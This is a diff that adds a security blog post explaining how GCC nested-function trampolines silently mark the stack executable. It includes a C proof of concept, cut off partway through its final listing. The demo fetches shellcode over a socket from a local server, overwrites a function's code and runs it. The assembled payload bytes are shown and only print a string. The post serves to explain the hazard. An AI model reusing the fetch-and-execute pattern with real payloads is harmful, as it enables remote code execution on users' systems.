@@ -1,0 +1,551 @@
+<!doctype html><html lang=en-us>
+<head>
+<link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
+<link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
+<link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous>
+<link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous>
+<script type=text/javascript src=https://latest.cactus.chat/cactus.js></script>
+<link rel=stylesheet href=https://latest.cactus.chat/style.css type=text/css>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<title> gcc Silent Trampoline Execstack Abuse | SixSixtySix Corp.</title>
+<link rel=canonical href=https://6sixty6.github.io/posts/2022-02-19-gcc-silent-trampoline-execstack-abuse/>
+<meta name=description content="KEEPING THE SCENE ALIVE 👾 🚀">
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=robots content="all,follow">
+<meta name=googlebot content="index,follow,snippet,archive">
+<meta property="og:title" content="gcc Silent Trampoline Execstack Abuse">
+<meta property="og:description" content="author:[xoreaxeax] Danger by design of GNU&rsquo;s GCC nested functions raises from use of trampolines - small pieces of code used to implement pointers to nested functions.
+These trampolines are created on stack, meaning the stack needs to be marked as executable for nested functions to be executed - the nested function pointer is after all the address of the trampoline itself.
+Executable stack is heavily frowned upon on modern systems. In this case however, the bigger problem arises from the stack being set to RWE (Read/Write/Execute) silently, without any warning message during compilation and linking.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://6sixty6.github.io/posts/2022-02-19-gcc-silent-trampoline-execstack-abuse/"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2022-02-19T09:00:00+00:00">
+<meta property="article:modified_time" content="2022-02-19T09:00:00+00:00">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="gcc Silent Trampoline Execstack Abuse">
+<meta name=twitter:description content="author:[xoreaxeax] Danger by design of GNU&rsquo;s GCC nested functions raises from use of trampolines - small pieces of code used to implement pointers to nested functions.
+These trampolines are created on stack, meaning the stack needs to be marked as executable for nested functions to be executed - the nested function pointer is after all the address of the trampoline itself.
+Executable stack is heavily frowned upon on modern systems. In this case however, the bigger problem arises from the stack being set to RWE (Read/Write/Execute) silently, without any warning message during compilation and linking.">
+<link rel=stylesheet href=https://6sixty6.github.io/css/styles.f4bcceabbdd517d94a591c375093a75082a29fe2890ff08dc010a5a3d0f4ac93e03a09e432cecb1b27ff0942772ab90896387af68ddd8ffa54ac31824f281ef1.css integrity="sha512-9LzOq73VF9lKWRw3UJOnUIKin+KJD/CNwBClo9D0rJPgOgnkMs7LGyf/CUJ3KrkIljh69o3dj/pUrDGCTyge8Q=="><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script>
+<script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]-->
+<link rel=icon type=image/png href=https://6sixty6.github.io/images/favicon.ico>
+</head>
+<body class="max-width mx-auto px3 ltr">
+<div class="content index py4">
+<div id=header-post>
+<a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
+<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
+<a id=top-icon-tablet href=# onclick="$('html, body').animate({scrollTop:0},'fast')" style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+<span id=menu>
+<span id=nav>
+<ul>
+<li><a href=/>Home</a></li>
+<li><a href=/posts>Writings</a></li>
+<li><a href=/tags>Tags</a></li>
+<li><a href=/about>About</a></li>
+<li><a href=/members>Members</a></li>
+</ul>
+</span>
+<br>
+<span id=actions>
+<ul>
+<li>
+<a class=icon href=https://6sixty6.github.io/about/ aria-label=Previous>
+<i class="fas fa-chevron-left" aria-hidden=true onmouseover="$('#i-prev').toggle()" onmouseout="$('#i-prev').toggle()"></i>
+</a>
+</li>
+<li>
+<a class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
+<i class="fas fa-chevron-up" aria-hidden=true onmouseover="$('#i-top').toggle()" onmouseout="$('#i-top').toggle()"></i>
+</a>
+</li>
+<li>
+<a class=icon href=# aria-label=Share>
+<i class="fas fa-share-alt" aria-hidden=true onmouseover="$('#i-share').toggle()" onmouseout="$('#i-share').toggle()" onclick="return $('#share').toggle(),!1"></i>
+</a>
+</li>
+</ul>
+<span id=i-prev class=info style=display:none>Previous post</span>
+<span id=i-next class=info style=display:none>Next post</span>
+<span id=i-top class=info style=display:none>Back to top</span>
+<span id=i-share class=info style=display:none>Share post</span>
+</span>
+<br>
+<div id=share style=display:none>
+<ul>
+<li>
+<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f" aria-label=Facebook>
+<i class="fab fa-facebook" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="https://twitter.com/share?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f&text=gcc%20Silent%20Trampoline%20Execstack%20Abuse" aria-label=Twitter>
+<i class="fab fa-twitter" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f&title=gcc%20Silent%20Trampoline%20Execstack%20Abuse" aria-label=Linkedin>
+<i class="fab fa-linkedin" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f&is_video=false&description=gcc%20Silent%20Trampoline%20Execstack%20Abuse" aria-label=Pinterest>
+<i class="fab fa-pinterest" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="mailto:?subject=gcc%20Silent%20Trampoline%20Execstack%20Abuse&body=Check out this article: https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f" aria-label=Email>
+<i class="fas fa-envelope" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f&title=gcc%20Silent%20Trampoline%20Execstack%20Abuse" aria-label=Pocket>
+<i class="fab fa-get-pocket" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f&title=gcc%20Silent%20Trampoline%20Execstack%20Abuse" aria-label=reddit>
+<i class="fab fa-reddit" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f&name=gcc%20Silent%20Trampoline%20Execstack%20Abuse&description=author%3a%5bxoreaxeax%5d%20Danger%20by%20design%20of%20GNU%26rsquo%3bs%20GCC%20nested%20functions%20raises%20from%20use%20of%20trampolines%20-%20small%20pieces%20of%20code%20used%20to%20implement%20pointers%20to%20nested%20functions.%0aThese%20trampolines%20are%20created%20on%20stack%2c%20meaning%20the%20stack%20needs%20to%20be%20marked%20as%20executable%20for%20nested%20functions%20to%20be%20executed%20-%20the%20nested%20function%20pointer%20is%20after%20all%20the%20address%20of%20the%20trampoline%20itself.%0aExecutable%20stack%20is%20heavily%20frowned%20upon%20on%20modern%20systems.%20In%20this%20case%20however%2c%20the%20bigger%20problem%20arises%20from%20the%20stack%20being%20set%20to%20RWE%20%28Read%2fWrite%2fExecute%29%20silently%2c%20without%20any%20warning%20message%20during%20compilation%20and%20linking." aria-label=Tumblr>
+<i class="fab fa-tumblr" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f&t=gcc%20Silent%20Trampoline%20Execstack%20Abuse" aria-label="Hacker News">
+<i class="fab fa-hacker-news" aria-hidden=true></i>
+</a>
+</li>
+</ul>
+</div>
+<div id=toc>
+<nav id=TableOfContents></nav>
+</div>
+</span>
+</div>
+<article class=post itemscope itemtype=http://schema.org/BlogPosting>
+<header>
+<h1 class=posttitle itemprop="name headline">
+gcc Silent Trampoline Execstack Abuse
+</h1>
+<div class=meta>
+<div class=postdate>
+<time datetime="2022-02-19 09:00:00 +0000 UTC" itemprop=datePublished>2022-02-19</time>
+</div>
+<div class=article-tag>
+<i class="fas fa-tag"></i>
+<a class=tag-link href=/tags/linux rel=tag>linux</a>
+,
+<a class=tag-link href=/tags/gcc rel=tag>gcc</a>
+,
+<a class=tag-link href=/tags/xoreaxeax rel=tag>xoreaxeax</a>
+</div>
+</div>
+</header>
+<div class=content itemprop=articleBody>
+<h1 id=authorxoreaxeaxhttpsgithubcomx0reaxeax>author:<a href=https://github.com/x0reaxeax>[xoreaxeax]</a></h1>
+<p>Danger by design of GNU&rsquo;s GCC nested functions raises from use of trampolines - small pieces of code used to implement pointers to nested functions.<br>
+These trampolines are created on stack, meaning the stack needs to be marked as executable for nested functions to be executed - the nested function pointer is after all the address of the trampoline itself.<br>
+Executable stack is heavily frowned upon on modern systems. In this case however, the bigger problem arises from the stack being set to <code>RWE</code> (Read/Write/Execute) <strong>silently</strong>, without any warning message during compilation and linking.<br>
+Although GCC offers a warning flag - <code>-Wtrampolines</code>, to warn about any generated trampolines, the warning is not enabled by default, which can lead to nasty consequences.<br>
+To be more specific, it allows for executable code to be rewritten during runtime.</p>
+<p>We can see the <code>RWE</code> flag in the output of GNU binutils' <code>readelf(1)</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#960050;background-color:#1e0010>$</span> readelf <span style=color:#f92672>-</span>l .<span style=color:#f92672>/</span>a.out
+Program Headers:
+  Type           Offset             VirtAddr           PhysAddr
+                 FileSiz            MemSiz              Flags  Align
+  ... 
+  GNU_STACK      <span style=color:#ae81ff>0x0000000000000000</span> <span style=color:#ae81ff>0x0000000000000000</span> <span style=color:#ae81ff>0x0000000000000000</span>
+                 <span style=color:#ae81ff>0x0000000000000000</span> <span style=color:#ae81ff>0x0000000000000000</span>  RWE    <span style=color:#ae81ff>0x10</span>
+  ... 
+</code></pre></div><p>This demo shows a simple abuse of this mechanism by defining a nested function <code>bar()</code>,<br>
+which <strong>defined</strong> purpose is to prompt end user for their name and greet them.<br>
+This function however, thanks to the consequential use of stack trampolines,<br>
+will be rewritten and completely altered by a shellcode payload fetched from a remote location.<br>
+After the function opcodes are successfully rewritten, the nested function will be called from outside of it&rsquo;s enclosing function&rsquo;s scope.<br>
+We can refer to <a href=https://gcc.gnu.org/onlinedocs/gcc/Nested-Functions.html>GCC manual - 6.4 Nested Functions</a>, which reminds us this may not be the best idea:</p>
+<p><em>&ldquo;If you try to call the nested function through its address after the containing function exits, all hell breaks loose."</em></p>
+<p>Even though this example assumes complete control over source code, executable stack can be identically abused in already compiled binaries,
+if another vulnerability in code offers an entry point for arbitrary memory write.</p>
+<p>To clarify, this demo does not go into detail on how nested functions and trampolines actually work,
+instead, it points at the <strong>seemingly</strong> irrelevant consequences of using these GCC extensions.</p>
+<p>The following code will represent the enclosing and nested function in our demo:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> <span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>void</span>) {
+    <span style=color:#75715e>/* harmless nested function `bar()` */</span>
+    <span style=color:#66d9ef>int</span> bar(<span style=color:#66d9ef>void</span>) { 
+        <span style=color:#66d9ef>char</span> name_buf[<span style=color:#ae81ff>256</span>] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0</span> };
+        puts(<span style=color:#e6db74>&#34;I&#39;m a harmless function!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+        puts(<span style=color:#e6db74>&#34;Please tell me your name!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+        printf(<span style=color:#e6db74>&#34;Your name: &#34;</span>);
+        fflush(stdout);
+        fgets(name_buf, <span style=color:#ae81ff>255</span>, stdin);
+        name_buf[strcspn(name_buf, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#34;</span>)] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+        printf(<span style=color:#e6db74>&#34;Hi %s!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, name_buf);
+
+        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>; 
+    }
+    
+    <span style=color:#75715e>/* exposes the address of nested function outside of it&#39;s local scope */</span>
+    <span style=color:#66d9ef>return</span> bar;
+}
+</code></pre></div><p>The nested function will be executed using the the following <code>exec()</code> function:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>/* the argument passed as to `exec()` is the address of nested function `bar()` */</span>
+<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>__attribute__</span> ((__naked__)) exec(<span style=color:#66d9ef>void</span> (<span style=color:#f92672>*</span>func)()) {
+    __asm__ <span style=color:#66d9ef>volatile</span> ( 
+            <span style=color:#e6db74>&#34;.intel_syntax noprefix;&#34;</span>
+            <span style=color:#e6db74>&#34;call rdi;&#34;</span> <span style=color:#75715e>/* the function&#39;s address will be passed in RDI register, *
+</span><span style=color:#75715e>                         * so we can directly call it                             */</span>
+            <span style=color:#e6db74>&#34;.att_syntax;&#34;</span>
+            <span style=color:#f92672>::</span>          <span style=color:#75715e>/* no output/input operands */</span>
+            <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;rdi&#34;</span>     <span style=color:#75715e>/* rdi register clobber */</span>
+    );
+}
+</code></pre></div><p>Next, this simple implementation of network communication by the help of Linux sockets will be utilized for retrieving the shellcode from a remote source:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#define FD_INVALID -1
+</span><span style=color:#75715e></span>
+<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>fetch_bytes</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>destip, <span style=color:#66d9ef>uint16_t</span> destport, byte <span style=color:#f92672>*</span>outbuf, size_t bufsiz) {
+    <span style=color:#66d9ef>if</span> (NULL <span style=color:#f92672>==</span> outbuf <span style=color:#f92672>||</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>==</span> bufsiz) {
+        <span style=color:#66d9ef>return</span> EXIT_FAILURE;
+    }
+
+    <span style=color:#66d9ef>int</span> ret_code <span style=color:#f92672>=</span> EXIT_SUCCESS;
+    <span style=color:#66d9ef>char</span> reply_buf[<span style=color:#ae81ff>512</span>] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0</span> };    <span style=color:#75715e>/* will store unformatted fetched remote data */</span>
+    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>payload_ptr <span style=color:#f92672>=</span> NULL;       <span style=color:#75715e>/* points to the beginning of actual shellcode */</span>
+    <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> request[] <span style=color:#f92672>=</span>
+            <span style=color:#e6db74>&#34;GET /payload</span><span style=color:#ae81ff>\r\n\r\n</span><span style=color:#e6db74>&#34;</span>; <span style=color:#75715e>/* the shellcode resides in remote file named `payload` */</span>
+    
+    <span style=color:#66d9ef>int</span> sockfd <span style=color:#f92672>=</span> FD_INVALID;
+    size_t recvlen <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+    <span style=color:#66d9ef>struct</span> sockaddr_in remote;
+
+    sockfd <span style=color:#f92672>=</span> socket(AF_INET, SOCK_STREAM, <span style=color:#ae81ff>0</span>);
+
+    <span style=color:#66d9ef>if</span> (sockfd <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
+        <span style=color:#66d9ef>return</span> EXIT_FAILURE;
+    }
+    
+    remote.sin_addr.s_addr <span style=color:#f92672>=</span> inet_addr(destip);
+    remote.sin_family <span style=color:#f92672>=</span> AF_INET;
+    remote.sin_port <span style=color:#f92672>=</span> htons(destport);
+
+    <span style=color:#66d9ef>if</span> (connect(sockfd, (<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>struct</span> sockaddr <span style=color:#f92672>*</span>) <span style=color:#f92672>&amp;</span>remote, <span style=color:#66d9ef>sizeof</span>(remote)) <span style=color:#f92672>&lt;</span> EXIT_SUCCESS) {
+        ret_code <span style=color:#f92672>=</span> EXIT_FAILURE;
+        <span style=color:#66d9ef>goto</span> _FINAL;
+    } 
+    
+    <span style=color:#66d9ef>if</span> (sendto(sockfd, request, strlen(request), <span style=color:#ae81ff>0</span>, NULL, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>&lt;</span> EXIT_SUCCESS) {
+        ret_code <span style=color:#f92672>=</span> EXIT_FAILURE;
+        <span style=color:#66d9ef>goto</span> _FINAL;
+    }
+
+    <span style=color:#66d9ef>if</span> (recv(sockfd, reply_buf, <span style=color:#ae81ff>512</span>, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>&lt;</span> EXIT_SUCCESS) {
+        ret_code <span style=color:#f92672>=</span> EXIT_FAILURE;
+        <span style=color:#66d9ef>goto</span> _FINAL;
+    }
+
+    <span style=color:#75715e>/**
+</span><span style=color:#75715e>     * &#34;verify&#34; if shellcode has been successfully received
+</span><span style=color:#75715e>     * by looking for the specific byte `0xcc`.
+</span><span style=color:#75715e>     * this byte is only used to mark the start of the shellcode and 
+</span><span style=color:#75715e>     * will be actually omitted from it.
+</span><span style=color:#75715e>     * if the byte is not present in the fetched data, abort.
+</span><span style=color:#75715e>    */</span> 
+    payload_ptr <span style=color:#f92672>=</span> strchr(reply_buf, <span style=color:#ae81ff>0xcc</span>);
+
+    <span style=color:#66d9ef>if</span> (NULL <span style=color:#f92672>==</span> payload_ptr) {
+        ret_code <span style=color:#f92672>=</span> EXIT_FAILURE;
+        <span style=color:#66d9ef>goto</span> _FINAL;
+    }
+
+    <span style=color:#75715e>/* copy the shellcode to output buffer */</span>
+    memcpy(outbuf, payload_ptr <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>, bufsiz);
+
+_FINAL:
+    <span style=color:#75715e>/* cleanup */</span>
+    shutdown(sockfd, SHUT_RDWR);
+    close(sockfd);
+    <span style=color:#66d9ef>return</span> ret_code;
+}
+</code></pre></div><p>Now it&rsquo;s time to craft the actual payload and setup a server for remotely accessing it.<br>
+The payload&rsquo;s duty in this case is quite simple - output the string &ldquo;viruz&rdquo; to the console (<code>STDOUT</code>) and trigger a trap to debugger (breakpoint).<br>
+The handy <a href=https://defuse.ca/online-x86-assembler.htm>Online x86 / x64 Assembler and Disassembler</a> will help with constructing the payload and converting it into opcode bytes:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#a6e22e>push</span>    <span style=color:#66d9ef>rdi</span>         <span style=color:#75715e>; the RDI register still holds the value of nested function `bar()`
+</span><span style=color:#75715e></span><span style=color:#66d9ef>xor</span>     <span style=color:#66d9ef>eax</span>, <span style=color:#66d9ef>eax</span>    <span style=color:#75715e>; clear eax ..
+</span><span style=color:#75715e></span><span style=color:#66d9ef>xor</span>     <span style=color:#66d9ef>edi</span>, <span style=color:#66d9ef>edi</span>    <span style=color:#75715e>; .. and edi..
+</span><span style=color:#75715e></span><span style=color:#66d9ef>xor</span>     <span style=color:#66d9ef>edx</span>, <span style=color:#66d9ef>edx</span>    <span style=color:#75715e>; .... and edx
+</span><span style=color:#75715e></span>                    <span style=color:#75715e>; eax = syscall number
+</span><span style=color:#75715e></span>                    <span style=color:#75715e>; edi = file descriptor number
+</span><span style=color:#75715e></span>                    <span style=color:#75715e>; rsi = (char *) buf - output string
+</span><span style=color:#75715e></span>                    <span style=color:#75715e>; edx = strlen(buf)
+</span><span style=color:#75715e></span><span style=color:#66d9ef>inc</span>     <span style=color:#66d9ef>eax</span>         <span style=color:#75715e>; 1 == sys_write syscall
+</span><span style=color:#75715e></span><span style=color:#66d9ef>inc</span>     <span style=color:#66d9ef>edi</span>         <span style=color:#75715e>; set edi to 1, since STDOUT_FILENO == 1
+</span><span style=color:#75715e></span><span style=color:#66d9ef>pop</span>     <span style=color:#66d9ef>rsi</span>         <span style=color:#75715e>; pop the address of `bar()` into rsi - 
+</span><span style=color:#75715e></span>                    <span style=color:#75715e>;   this will be used to get address of output string,
+</span><span style=color:#75715e></span>                    <span style=color:#75715e>;   which is located at the end of the payload
+</span><span style=color:#75715e></span><span style=color:#66d9ef>add</span>     <span style=color:#66d9ef>rsi</span>, <span style=color:#ae81ff>0x10</span>   <span style=color:#75715e>; add offset 22 (0x16) to the address of `bar()`,
+</span><span style=color:#75715e></span>                    <span style=color:#75715e>;   so it points to the output string.
+</span><span style=color:#75715e></span>                    <span style=color:#75715e>;   this offset can be easily determined from assembled bytes
+</span><span style=color:#75715e></span><span style=color:#66d9ef>add</span>     <span style=color:#66d9ef>edx</span>, <span style=color:#ae81ff>0x6</span>    <span style=color:#75715e>; strlen
+</span><span style=color:#75715e></span><span style=color:#66d9ef>syscall</span>
+<span style=color:#a6e22e>int3</span>                <span style=color:#75715e>; trap to debugger (breakpoint)
+</span><span style=color:#75715e></span>
+                    <span style=color:#75715e>; output string bytes start here
+</span><span style=color:#75715e></span><span style=color:#a6e22e>db</span>      <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#66d9ef>v</span><span style=color:#960050;background-color:#1e0010>&#39;</span>
+<span style=color:#a6e22e>db</span>      <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#66d9ef>i</span><span style=color:#960050;background-color:#1e0010>&#39;</span>
+<span style=color:#a6e22e>db</span>      <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#66d9ef>r</span><span style=color:#960050;background-color:#1e0010>&#39;</span>
+<span style=color:#a6e22e>db</span>      <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#66d9ef>u</span><span style=color:#960050;background-color:#1e0010>&#39;</span>
+<span style=color:#a6e22e>db</span>      <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#66d9ef>z</span><span style=color:#960050;background-color:#1e0010>&#39;</span>
+<span style=color:#a6e22e>db</span>      <span style=color:#ae81ff>0xa</span>         <span style=color:#75715e>; newline
+</span></code></pre></div><p>The final assembled payload bytes will look like this:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x57\x31\xC0\x31\xFF\x31\xD2\xFF\xC0\xFF\xC7\x5E\x48\x83\xC6\x10\x83\xC2\x06\x0F\x05\xCC\x76\x69\x72\x75\x7a\x0a\x00</span><span style=color:#e6db74>&#34;</span>
+</code></pre></div><p>The function <code>fetch_bytes()</code> will identify the payload by locating it&rsquo;s pre-set starting byte <code>0xcc</code>.<br>
+Let&rsquo;s insert the starting byte at the beginning and store the whole payload in a file named <code>payload</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>$ printf <span style=color:#e6db74>&#34;\xcc\x57\x31\xC0\x31\xFF\x31\xD2\xFF\xC0\xFF\xC7\x5E\x48\x83\xC6\x10\x83\xC2\x06\x0F\x05\xCC\x76\x69\x72\x75\x7a\x0a\x00&#34;</span> &gt; payload
+</code></pre></div><p>Now that the size of the payload is known, <code>bar()</code>&rsquo;s opcodes can be rewritten with payload bytes:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#define PAYLOAD_SIZE 31
+</span><span style=color:#75715e></span>
+<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
+    size_t i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+    byte outbuf[PAYLOAD_SIZE] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0</span> };  <span style=color:#75715e>/* used to store the payload */</span>
+
+    <span style=color:#75715e>/* fetch payload from remote - 127.0.0.1:1337 */</span>
+    <span style=color:#66d9ef>if</span> (fetch_bytes(<span style=color:#e6db74>&#34;127.0.0.1&#34;</span>, <span style=color:#ae81ff>1337</span>, outbuf, PAYLOAD_SIZE) <span style=color:#f92672>!=</span> EXIT_SUCCESS) {
+        <span style=color:#66d9ef>return</span> EXIT_FAILURE;
+    }
+
+    <span style=color:#75715e>/* fetch the address of nested function `bar()` */</span>
+    byte <span style=color:#f92672>*</span>ptr <span style=color:#f92672>=</span> foo();
+
+    <span style=color:#75715e>/* rewrite the nested function with payload bytes */</span>
+    <span style=color:#66d9ef>for</span> (i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> PAYLOAD_SIZE;  i<span style=color:#f92672>++</span>) {
+        <span style=color:#f92672>*</span>(ptr <span style=color:#f92672>+</span> i) <span style=color:#f92672>=</span> outbuf[i]; 
+    }
+
+    <span style=color:#75715e>/* finally, execute the payload */</span>
+    exec((<span style=color:#66d9ef>void</span> (<span style=color:#f92672>*</span>)()) ptr);
+
+    <span style=color:#66d9ef>return</span> EXIT_SUCCESS;
+}
+</code></pre></div><p>The demo is finally ready, let&rsquo;s setup a remote server in the same folder where <code>payload</code> file is located:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>$ sudo php -S 127.0.0.1:1337 -t .
+</code></pre></div><p>And finally compile and execute the completed code:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>$ gcc demo.c
+$ ./a.out
+viruz
+Trace/Breakpoint trap
+</code></pre></div><p>The binary rewrote it&rsquo;s own code during runtime and instead of prompting the user for their name, the remote payload was executed.</p>
+<p><strong>Final code:</strong></p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/socket.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;netinet/in.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;arpa/inet.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span>
+<span style=color:#75715e>#define FD_INVALID      -1
+</span><span style=color:#75715e>#define PAYLOAD_SIZE    31
+</span><span style=color:#75715e></span>
+<span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> byte;
+
+<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>fetch_bytes</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>destip, <span style=color:#66d9ef>uint16_t</span> destport, byte <span style=color:#f92672>*</span>outbuf, size_t bufsiz) {
+    <span style=color:#66d9ef>if</span> (NULL <span style=color:#f92672>==</span> outbuf <span style=color:#f92672>||</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>==</span> bufsiz) {
+        <span style=color:#66d9ef>return</span> EXIT_FAILURE;
+    }
+
+    <span style=color:#66d9ef>int</span> ret_code <span style=color:#f92672>=</span> EXIT_SUCCESS;
+    <span style=color:#66d9ef>char</span> reply_buf[<span style=color:#ae81ff>512</span>] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0</span> };
+    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>payload_ptr <span style=color:#f92672>=</span> NULL;
+    <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> request[] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;GET /payload</span><span style=color:#ae81ff>\r\n\r\n</span><span style=color:#e6db74>&#34;</span>;
+    
+    <span style=color:#66d9ef>int</span> sockfd <span style=color:#f92672>=</span> FD_INVALID;
